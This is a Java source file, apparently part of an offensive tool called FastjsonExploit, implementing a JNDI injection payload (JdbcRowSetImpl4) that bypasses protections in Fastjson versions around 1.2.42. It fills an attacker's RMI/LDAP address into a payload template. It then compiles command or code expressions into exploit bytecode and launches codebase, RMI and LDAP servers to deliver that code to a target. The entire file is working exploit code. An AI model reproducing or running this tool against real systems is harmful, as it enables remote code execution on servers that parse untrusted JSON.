@payloads.annotation.PayloadType({ payloads.annotation.PayloadType.JNDI })
@payloads.annotation.Dependencies({ "JdbcRowSetImpl1:Fastjson 1.2.42 bypass" })
@payloads.annotation.VulVersion({ "1.2.2.1-1.2.4.2" })
public class JdbcRowSetImpl4 implements payloads.ObjectPayload {
	@java.lang.Override
	public void process(java.lang.String[] args) {
		if ((args.length != 3) && (args.length != 4)) {
			java.lang.System.out.println("[*] Usage: java -jar FastjsonExploit-[version].jar JdbcRowSetImpl4 [rmi/ldap address] [\"cmd:xxx|code:xxx.java\"]");
			return;
		}
		java.lang.String address = args[1].trim();
		java.lang.String expression = args[2].trim();
		if (!util.AddressParser.isAddress(address)) {
			util.Alert.printValidAddress();
			return;
		}
		util.JarFileReader jarFileReader = new util.JarFileReader();
		java.lang.String payload = jarFileReader.read("JdbcRowSetImpl4.tpl");
		payload = payload.replace("###RMI_LDAP_ADDRESS###", address);
		java.lang.System.out.println("[*] payload build success!");
		java.lang.System.out.println("");
		java.lang.System.out.println(payload);
		java.lang.System.out.println("");
		util.Common.byteCode = gadget.Gadget.getJdbcRowSetImplExpCode(expression);
		util.AddressParser ap = new util.AddressParser();
		ap.parser(address);
		try {
			java.lang.String server_host = ap.getHost();
			java.lang.Integer service_port = java.lang.Integer.valueOf(ap.getPort());
			int http_port = util.Util.getUnusePort("127.0.0.1");
			server.CodebaseServer.lanuchCodebaseURLServer(server_host, http_port);
			if (ap.getProtocol().equals("rmi")) {
				server.RMIServer.lanuchRMIregister(service_port, server_host, http_port);
			} else if (ap.getProtocol().equals("ldap")) {
				server.LDAPServer.lanuchLDAPServer(service_port, server_host, http_port);
			}
		} catch (java.lang.Exception e) {
			e.printStackTrace();
			java.lang.System.out.println("FastjsonExploit exit!");
			java.lang.System.exit(0);
		}
		if ((args.length == 4) && args[3].equals("-exec")) {
			java.lang.System.out.println("[*] Try local parsing");
			com.alibaba.fastjson.JSON.parse(payload);
		}
	}

	public static void main(java.lang.String[] args) {
		if ((args.length != 1) && (args.length != 2)) {
			java.lang.System.out.println("[*] Usge: java -cp FastjsonExploit-<version>.jar payloads.JdbcRowSetImpl4 <rmi/ldap address>");
			return;
		}
		java.lang.String address = args[0].trim();
		if (!util.AddressParser.isAddress(address)) {
			java.lang.System.out.println("[*] address is not rmi or ldap");
			return;
		}
		util.JarFileReader jarFileReader = new util.JarFileReader();
		java.lang.String payload = jarFileReader.read("JdbcRowSetImpl4.tpl");
		payload = payload.replace("###RMI_LDAP_ADDRESS###", address);
		java.lang.System.out.println(payload);
		if ((args.length == 2) && args[1].equals("-exec")) {
			com.alibaba.fastjson.JSON.parse(payload);
		}
	}
}